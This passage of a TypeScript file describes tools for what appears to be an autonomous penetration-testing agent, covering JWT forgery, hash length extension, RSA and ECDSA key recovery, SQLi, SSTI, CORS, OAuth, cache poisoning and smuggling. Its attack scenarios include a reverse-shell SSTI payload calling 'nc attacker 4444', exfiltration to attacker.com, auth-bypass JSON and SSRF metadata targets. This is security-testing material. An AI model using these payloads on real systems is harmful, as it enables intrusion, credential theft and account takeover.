    analogy: 'A lock that says "warmer / colder" as you turn the dial. With patience, you find the exact temperature — except every "warmer" is a million-times faster than turning the dial yourself.',
  },
  crypto_ecdsa_nonce_reuse: {
    what: 'Closed-form private-key recovery when two ECDSA signatures share the same nonce k. Curves: secp256k1, P-256, P-384, P-521. Inputs: r, s1, s2, message digests of both signed messages.',
    why: 'Reused k → trivial private-key recovery via simple algebra. This bug has appeared in PlayStation 3, Bitcoin libraries, and Fortinet firmware. When it\'s present, a few signatures = full key compromise.',
    attack: 'Target signs JWTs with ECDSA. The agent forces several signing operations under controlled inputs; two of them happen to share r (because the underlying RNG is broken). crypto_ecdsa_nonce_reuse(r, s1, s2, m1_hash, m2_hash) → returns the private key. The agent now signs arbitrary tokens.',
    analogy: 'Two letters sealed with the same wax stamp at the same angle. If you have both letters, you can reverse-engineer the stamp\'s shape exactly — and now you can seal anything.',
  },
  crypto_length_extension: {
    what: 'Hash length-extension attack. Given H(secret || known) where H is a Merkle-Damgård hash (MD5, SHA-1, SHA-256), the secret length, the known content, and bytes you want to append — produces a valid H(secret || known || glue || your_append) without needing the secret.',
    why: 'Some servers do auth via "compare H(secret || data) against client-supplied digest." That\'s broken: an attacker who has one valid (data, digest) pair can append arbitrary bytes and produce a new valid digest.',
    attack: 'Target API auth: GET /admin?command=read&token=md5(secret||command). The agent has a (read, md5_value) pair. crypto_length_extension --algo md5 --known "command=read" --append "&command=delete" --keylen 16 → returns the new query string + a valid token for command=delete. Server accepts → admin delete unlocked.',
    analogy: 'Imagine a security stamp that says "the contents up to here are approved, signed boss." If the stamp doesn\'t cover what comes after the stamp, you just write more stuff after it and the signature still says "approved up to here."',
  },
  crypto_rsa_low_e: {
    what: 'RSA attacks when the public exponent e is small. Three modes: plain (m^e < n, take integer e-th root), broadcast (Håstad — same m encrypted under e coprime moduli), franklin_reiter (two related plaintexts with e=3).',
    why: 'Many old / IoT / embedded systems use e=3 for speed. If the message is short or the moduli are coprime, the math collapses.',
    attack: 'Three IoT devices share a firmware-distribution key encrypted under e=3 with three different N values (CRT). crypto_rsa_low_e mode=broadcast c=[c1,c2,c3] n=[n1,n2,n3] → recovers the plaintext directly. No quantum computer required, just CRT.',
    analogy: 'Three Polaroids of the same sentence taken from three different angles. None alone is readable; together, you can reconstruct the sentence.',
  },
  crypto_lattice: {
    what: 'Wiener\'s small-d attack: when the RSA private exponent d is too small (d < n^0.25 / 3), continued fractions on e/n recover d directly. Coppersmith / Boneh-Durfee modes are stubbed (require SageMath).',
    why: 'Some hand-rolled RSA implementations choose a small d for performance. The choice is fatal under continued-fraction analysis.',
    attack: 'A custom signing service uses RSA with d = 2^60 (small for "speed"). crypto_lattice mode=wiener n=N e=E → returns d. The agent signs anything.',
    analogy: 'A combination lock where the owner picked a 4-digit PIN out of "convenience." Wiener\'s attack is the math equivalent of starting at 0000 and counting up — except the math takes seconds instead of a day.',
  },
  crypto_jwt_confusion: {
    what: 'Four JWT attacks bundled: alg_none (forge with case variants), hs_rs_swap (sign HS* using the server\'s RSA public PEM as HMAC secret), weak_secret (wordlist brute-force against HS*), kid_inject (rewrite kid to a known-content file path).',
    why: 'JWT libraries are a minefield. Most of these attacks exist because RFC 7519\'s alg field is trusted, the public key is "public," and kid is dereferenced as a path. One library bug per major flavour.',
    attack: 'Target uses RS256 JWTs. The agent runs crypto_jwt_confusion mode=hs_rs_swap with the server\'s RSA pubkey as the HMAC secret. Many libraries (jsonwebtoken pre-9, jose pre-2) accept either RS256 OR HS256 if alg says so. The forged HS256 token validates against the public key. Admin login achieved.',
    analogy: 'A passport that says "verify with stamp X" — but the border guard accepts ANY stamp the passport itself names. You write "verify with my stamp" and add your own signature.',
  },

  // ── Novel discovery (probes) ───────────────────────────────────────────
  oob_check: {
    what: 'Out-of-band callback infrastructure. The agent generates a unique token+URL, embeds it in a payload, and later asks "did anything call my URL?" — confirms blind SSRF, blind XXE, blind RCE, or any vulnerability where the response is silent but a side-effect exits the target.',
    why: 'Blind vulnerabilities don\'t reflect into the response. The only way to confirm them is "the target server made a network call back to me." OOB is that confirmation channel.',
    attack: 'Target /import endpoint takes a URL. The agent generates oob.example.com/abc123, posts that as the URL. Server fetches it (server-side request). oob_check returns "callback hit at 14:32 from target IP." Blind SSRF confirmed with oracle-grade evidence.',
    analogy: 'You suspect a building\'s mailroom is forwarding mail without checking. You drop in a self-addressed return envelope. If it comes back, the building forwarded it. Silence proves nothing; the return envelope proves everything.',
  },
  differential_probe: {
    what: 'Sends multiple variants of an HTTP request (different methods, headers, or body shapes) and reports behavioural differences in the response. Useful for boolean-based blind injection, auth inconsistencies, and trust-boundary leaks.',
    why: 'Many bugs only show up as a difference between request A and request B. differential_probe makes that comparison the primary signal instead of an afterthought.',
    attack: 'Target login form. differential_probe with username=admin\' AND 1=1-- vs username=admin\' AND 1=2-- → response time differs by 800ms (time-based blind SQLi) or response length differs (boolean-based). Either confirms the injection.',
    analogy: 'Asking the same store clerk the same question two ways and noticing they answer slightly differently when the question contains a typo vs not — the typo is a hint that the system underneath is reading the input literally.',
  },
  race_probe: {
    what: 'Concurrency-based race-condition tester. Fires N parallel requests at the same state-changing endpoint and reports anomalies (a balance going negative, a coupon being used twice, a vote double-counted).',
    why: 'TOCTOU bugs (time-of-check vs time-of-use) only manifest under concurrency. A single sequential test will never see them. race_probe makes them surface.',
    attack: 'Target /coupon/redeem endpoint accepts a one-use coupon. race_probe --concurrency 10 --request "POST /coupon/redeem code=SAVE10" → the coupon is "used" 7 times, granting 7 discounts before the lock acquires. TOCTOU confirmed.',
    analogy: 'Ten people in a queue all trying to claim the last item at exactly the same moment. The shop\'s computer says "one in stock, one available" to all ten before any of them have completed checkout. Seven of them walk out with the item.',
  },
  session_memory: {
    what: 'A session-scoped key-value store the agent uses to remember discoveries across iterations: stored credentials, observed endpoints, framework versions, JWTs.',
    why: 'Without it, every iteration starts with zero memory. With it, the agent in iteration 12 can recall "I found admin:Password123 on iteration 4 — try it for SSH lateral movement now."',
    attack: 'Iteration 4: agent finds admin:Password123 via SQLi dump. session_memory store user/admin = Password123. Iteration 9: agent observes a SSH service. Queries session_memory category=credentials. Returns the credential. SSH login succeeds.',
    analogy: 'A detective\'s notebook. Without it, every interview is a fresh start. With it, in chapter 9 you flip back to chapter 4 and notice the suspect mentioned the same hotel as the third witness.',
  },

  // ── HTTP vuln probes ────────────────────────────────────────────────────
  idor_probe: {
    what: 'Tests Insecure Direct Object Reference / Broken Object-Level Authorization (BOLA). Cycles object IDs and compares responses across two auth tokens.',
    why: 'IDOR is the #1 API bug in 2026. Most APIs trust the JWT for "are you logged in?" but never check "are you allowed to read object X?"',
    attack: 'idor_probe --endpoint /api/users/{id} --token_a alice_jwt --token_b bob_jwt --range 1-100 → confirms Alice can read Bob\'s, Charlie\'s, and David\'s user objects. Cross-tenant data exposure confirmed.',
    analogy: 'A library where every shelf is unlocked, but the librarian only checks if you have a library card — not whether the book is yours. You walk in with your card, walk out with someone else\'s book.',
  },
  cors_probe: {
    what: 'Tests Cross-Origin Resource Sharing misconfigurations. Specifically: does the server reflect the Origin header into Access-Control-Allow-Origin while also setting Allow-Credentials: true?',
    why: 'A reflected ACAO + ACAC=true is functionally equivalent to "any website can read your authenticated content." Stored XSS-grade severity.',
    attack: 'cors_probe --url http://target/api/me → returns Access-Control-Allow-Origin: https://attacker.com, Allow-Credentials: true. The agent now hosts a page on attacker.com that fetches /api/me with credentials: include and exfiltrates the response.',
    analogy: 'A bank that lets anyone walk in claiming "I\'m here on behalf of John" — and hands them John\'s statements without verifying. The check is theatre.',
  },
  jwt_probe: {
    what: 'Inspects a JWT for common weaknesses: alg field, missing signature validation, weak HMAC secrets, kid header injection, unverified RS256→HS256 confusion.',
    why: 'JWTs are everywhere; their failure modes are catalogued and one-shot.',
    attack: 'jwt_probe finds the target accepts alg=none. The agent forges a token with {"alg":"none","typ":"JWT"}.{"sub":"admin","role":"admin"}. and an empty signature. Sends it. Admin endpoint responds 200.',
    analogy: 'A passport that lets you fill in the "verified by" field yourself. You write "verified" and the border guard waves you through.',
  },
  graphql_probe: {
    what: 'Tests GraphQL endpoints for introspection enabled, schema disclosure, alias amplification (DoS), and field-level authorisation gaps.',
    why: 'GraphQL is a single endpoint that can expose enormous query power. Many implementations expose introspection in production by mistake.',
    attack: 'graphql_probe finds /graphql with introspection enabled. The agent reads the entire schema, discovers a getAllUsers query that returns admin emails + password reset tokens. No authorization check on the field.',
    analogy: 'A restaurant where the menu is a touchscreen with every dish, every recipe, every ingredient cost — and any customer can browse the kitchen prep notes by tapping a different tab.',
  },
  ssti_detect: {
    what: 'Server-Side Template Injection probe. Tests whether user input flows into a template engine (Jinja2, Twig, ERB, Handlebars, FreeMarker, Velocity) that evaluates it instead of escaping it.',
    why: 'SSTI is RCE-class. A successful injection in Jinja2 → import os → os.system("anything").',
    attack: 'ssti_detect finds /preview?name={{7*7}} returns "49" (the engine evaluated the expression). The agent payloads {{ ".__class__.__mro__[1].__subclasses__()[396]("/etc/passwd").read() }} and reads /etc/passwd. Then payloads __import__("os").system("nc attacker 4444 -e /bin/sh") for full RCE.',
    analogy: 'A printer that\'s supposed to print whatever you type — but if you type a printer-control code, it actually executes the code. You wanted to print "echo HI" and instead the printer ran echo HI in the shell.',
  },
  nosql_probe: {
    what: 'NoSQL injection probe (MongoDB-flavoured). Tests for $ne, $regex, $where, $gt operator injection in JSON request bodies — typically against login endpoints.',
    why: 'Node.js + MongoDB stacks often parse the body as a generic object and use it directly in find queries. {"username": {"$ne": null}, "password": {"$ne": null}} = login as the first user in the DB.',
    attack: 'Target Node.js login at POST /login with JSON body. nosql_probe sends {"username": {"$ne":null}, "password": {"$ne":null}} → 200 OK with admin\'s session cookie. Auth bypass with no credentials.',
    analogy: 'A clerk who reads "is this the right name and password?" as a literal string. You hand them a card that says "any name, any password" and they shrug, type that into the system, and it returns the first matching record (which is everyone).',
  },
  cache_probe: {
    what: 'HTTP cache poisoning detector. Tests whether unkeyed inputs (X-Forwarded-Host, X-Original-URL, X-Forwarded-Scheme, port headers) are reflected into responses and then cached for other users.',
    why: 'When a CDN caches responses but ignores certain headers, an attacker can poison the cache so the next user gets the attacker\'s response.',
    attack: 'cache_probe finds X-Forwarded-Host is reflected into the password-reset email link AND not in the cache key. The agent sends a request with X-Forwarded-Host: attacker.com. The CDN caches the response. Every subsequent password-reset email contains the attacker\'s host.',
    analogy: 'A copying machine in a library that keeps the last image in its scanner and reprints it on the next person\'s page. You scan a stamp that says "RETURN TO X". The next thirty people\'s scans all carry your stamp.',
  },
  prototype_pollution_probe: {
    what: 'JavaScript prototype-pollution detector. Tests whether merge/extend/deep-copy endpoints accept __proto__ / constructor.prototype keys that mutate Object.prototype globally.',
    why: 'Once Object.prototype is polluted, every object in the running Node process inherits the malicious property. Often leads to RCE via gadget chains in the framework or its dependencies.',
    attack: 'prototype_pollution_probe finds a /config POST endpoint that accepts JSON. Sends {"__proto__": {"isAdmin": true}}. Subsequent requests from any user have isAdmin=true on their session object (because session inherits from Object.prototype). Vertical privilege escalation.',
    analogy: 'A library where you can edit the master template that every book is printed from. You stick a sentence in the template; from then on, every newly-printed book contains your sentence — including books that were already on the shelves.',
  },
  oauth_probe: {
    what: 'OAuth 2.0 / OIDC flow analyzer. Tests redirect_uri validation, state parameter handling, scope escalation, PKCE downgrade, and code-for-token confusion.',
    why: 'Most OAuth bugs are in the redirect_uri validator — and the validator is harder to write than it looks. A redirect to attacker.com leaks the auth code.',
    attack: 'oauth_probe at /oauth/authorize finds redirect_uri=//attacker.com//target.com is accepted (the validator only checked that target.com appears anywhere in the URL). The agent crafts a phishing link that, when victims click it, sends their auth code to attacker.com.',
    analogy: 'A doorman who checks "does the address contain `Smith`?" — but the visitor\'s pass says "Smith Hotel\'s back door, c/o not-Smith-at-all". The doorman waves them through. Now anything you mail to that address goes to the wrong person.',
  },
  http_smuggling_probe: {
    what: 'HTTP request smuggling tester. Sends specially crafted requests (Transfer-Encoding + Content-Length conflicts) to detect frontends/backends parsing the request boundary differently.',
    why: 'When a CDN parses the request one way and the origin parses it another, an attacker can prepend a request that gets attached to the next user\'s request. Attacker→user request poisoning.',
    attack: 'http_smuggling_probe finds CL.TE smuggling on the target\'s Cloudflare → Nginx pipeline. The agent smuggles a GET /admin request that gets attached to the next legitimate user\'s session (carrying their auth cookie). Response is the admin panel as that user.',
    analogy: 'A postal sorting belt where two clerks disagree about where one envelope ends and the next starts. Mail your letter with a confusing seal, and the second clerk staples your letter onto the back of the next person\'s envelope.',
  },

  // ── Misc / hand-rolled ─────────────────────────────────────────────────
  payload_crafter: {
    what: 'Generates context-aware attack payloads — XSS variants, SQLi polyglots, SSRF metadata-IPs, file-upload bypasses, command-injection chains — with WAF-bypass mutations.',
    why: 'Saves the agent from hand-writing the same canonical payloads every session. payload_crafter --type ssrf returns the IMDS list, the localhost variants, the IPv6 bypasses, all in one call.',
    attack: 'payload_crafter --type ssrf → returns 169.254.169.254/latest/meta-data/, [::ffff:127.0.0.1]/, file:///etc/passwd, etc. The agent feeds them to an SSRF endpoint via curl_probe one by one.',
    analogy: 'A locksmith\'s pre-cut master key set for common building locks. Saves you from filing keys by hand every time.',
  },
  binary_analyzer: {
    what: 'Strings extraction + binary metadata: file type, sections, imported functions, embedded URLs, hardcoded keys, language detection.',
    why: 'Quickest first-pass on a pulled binary. Often surfaces hardcoded API keys or developer email addresses without any decompilation.',
    attack: 'binary_analyzer config.bin → string match on "AKIA[A-Z0-9]{16}" returns "AKIAIOSFODNN7EXAMPLE". Hardcoded AWS access key. Hand to AWS-CLI for account takeover.',
    analogy: 'Putting a sealed letter under a strong light. You can\'t read every word, but you can spot the addressee, the return address, and any words written in capital letters bleeding through the envelope.',
  },
  code_pattern_search: {
    what: 'Regex-based code search across artifacts pulled into the session — like grep, but scoped to the artifact volume the agent has access to.',
    why: 'When semgrep is overkill (you just want "find every place that calls dangerouslySetInnerHTML"), code_pattern_search is faster.',
    attack: 'code_pattern_search "exec\\(" in pulled Python repo → 14 matches; the agent reads each one to find the user-input-flowing-to-shell case.',
    analogy: 'A keyword search across all the documents in a filing cabinet. Less smart than a librarian, but instant.',
  },
};

export function getToolKnowledge(toolName: string): ToolKnowledge | null {
  return TOOL_KNOWLEDGE[toolName] ?? null;
}
